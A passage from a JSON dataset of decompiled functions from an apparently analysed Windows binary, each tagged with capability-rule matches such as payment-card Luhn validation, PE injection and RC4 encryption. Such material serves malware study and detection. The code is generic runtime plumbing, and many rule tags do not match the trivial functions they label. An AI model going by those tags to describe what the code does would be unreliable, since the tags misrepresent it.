        "decompiled_code": "\nvoid __fastcall fcn.0040fce4(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.0040f910();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.0040f910();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0040f910();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.0040f668();\n        }\n        fcn.0040fc3c();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0040fc58(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.0040f910();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.0040f910();\n                (*var_308h)();\n            }\n            cVar1 = fcn.0040fc88(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.0040f910();\n    }\n    return;\n}\n",
        "token_count": 819
    },
    "004100e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004100e0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x41019f;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.004100e0::pvarg;\n    puStack56 = 0x41010b;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x41017d;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x492c0c)(&fcn.004100e0::pvarg);\n    fcn.0040f91c();\n    arg_8h = &fcn.004100e0::var_14h;\n    fcn.00405694();\n    fcn.00405780(arg_8h);\n    fcn.00405028();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040fc3c(0x410184);\n    return;\n}\n",
        "token_count": 353
    },
    "004101ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004101ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.004101ac::pvarg;\n    puStack36 = 0x4101c1;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x410202;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040ff64();\n    (**0x496298)();\n    fcn.00410298();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x410209;\n    uStack40 = 0x410201;\n    fcn.0040fc3c();\n    return;\n}\n",
        "token_count": 204
    },
    "004107d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004107d4(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41087e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.004107d4::pvarg;\n    puStack52 = 0x4107fc;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x410861;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x492c0c)(&fcn.004107d4::pvarg);\n    fcn.0040f91c();\n    fcn.00405694();\n    fcn.00405780(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.0040fc3c(0x410868, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 359
    },
    "0041088c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041088c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.0041088c::pvarg;\n    puStack36 = 0x4108a1;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4108e2;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040ff64();\n    (**0x496298)();\n    fcn.004109b8();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4108e9;\n    uStack40 = 0x4108e1;\n    fcn.0040fc3c();\n    return;\n}\n",
        "token_count": 213
    },
    "004111c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.004111c0(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x4112e6;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x411204;\n        puStack540 = &stack0xfffffffc;\n        fcn.00404df4();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x41121c;\n        puStack540 = &stack0xfffffffc;\n        fcn.00404df4();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x411234;\n        puStack540 = &stack0xfffffffc;\n        fcn.00404df4();\n    }\n    else {\n        cVar1 = fcn.0041161c();\n        if (cVar1 == '\\0') {\n            fcn.00408e9c();\n            puStack552 = 0x4112a7;\n            fcn.004050b0();\n        }\n        else {\n            puStack552 = &fcn.004111c0::var_104h;\n            fcn.00403e38();\n            fcn.00402e7c();\n            fcn.00405004();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.004050b0();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.004050b0();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x4112ed;\n    iStack548 = 0x4112e5;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 499
    },
    "00411428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411428(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.0041161c(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.0041159c();\n    return;\n}\n",
        "token_count": 125
    },
    "0041147c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.0041147c(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x490a76 + (in_ECX >> 0x18));\n}\n",
        "token_count": 108
    },
    "004114f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004114f0(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x4114fb;\n    *NULL = fcn.00404324();\n    uStack16 = 0x4962a8;\n    uStack20 = 0x41150b;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x4962a4 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x490a34;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x41155a;\n    uStack24 = 0x4962a8;\n    uStack28 = 0x411552;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 283
    },
    "004116d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004116d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x4117ae;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x4962a8;\n    puStack308 = 0x41170b;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x411791;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00405ca4();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x4962a4 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x490a34)) {\n                fcn.00403e38();\n                fcn.00405004();\n                cVar2 = fcn.00408b5c();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x411798;\n    uStack312 = 0x4962a8;\n    uStack316 = 0x411790;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 485
    },
    "00411c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411c5c(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 332
    },
    "00411cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411cb0(void)\n\n{\n    fcn.0040503c();\n    fcn.00411c5c();\n    return;\n}\n",
        "token_count": 35
    },
    "00411cf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411cf8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00411ce4();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "00411dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411dc0(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x411e87;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.00405028();\n        fcn.00411d90();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.004055bc();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x411e8e;\n    uStack36 = 0x411e86;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 404
    },
    "004120a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004120a4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00412090();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "004120e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004120e4(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "0041211c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041211c(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00412158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412158(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00406588();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "00413bb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00413bb4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.00414eec();\n            cVar1 = fcn.00404184();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.00404184(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 204
    },
    "00413fc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413fc8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.00413c84();\n    fcn.00414d8c();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 219
    },
    "00414124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00414124(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x4141a7;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00403e38();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h_00, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x4141ae;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 283
    },
    "00414280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414280(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 38
    },
    "00414338": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414338(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00414584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00414584(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4145e4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x4145eb;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 230
    },
    "00414874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414874(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00414954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414954(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00408b5c();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "00414994": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00414994(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.00404df4();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "00414bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414bfc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x414c92;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x413794) && (in_EAX != *(arg_8h + -8))) {\n        fcn.00403ee4();\n        fcn.00414bfc(arg_8h);\n        fcn.00403e38();\n        fcn.00405004();\n        fcn.00405ef0(0);\n        fcn.00405f40();\n        fcn.00414a94();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x414c99;\n    uStack280 = 0x414c91;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 261
    },
    "00414dd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414dd8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00414e78();\n    }\n    iVar1 = fcn.00414eec();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.00402ee0();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00414e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414e40(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00414e3c();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040c5e8(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00404d94();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x004047ed. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 199
    },
    "00414f68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f68(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.00414e78();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.00402ee0();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "004150a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004150a8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00414e78();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402d18();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "004150e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
